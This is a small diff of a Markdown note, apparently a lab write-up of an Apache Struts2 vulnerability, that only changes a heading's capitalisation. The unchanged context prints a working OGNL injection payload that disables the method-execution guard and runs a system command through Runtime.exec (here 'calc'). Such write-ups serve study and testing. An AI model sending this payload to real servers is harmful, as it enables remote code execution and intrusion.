@@ -24,7 +24,7 @@ IDE: `idea 2020.1.1 ULTIMATE`
 
 ![{15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417]({15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417.jpg)
 
-## payload
+## Payload
 
 `?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)`
 
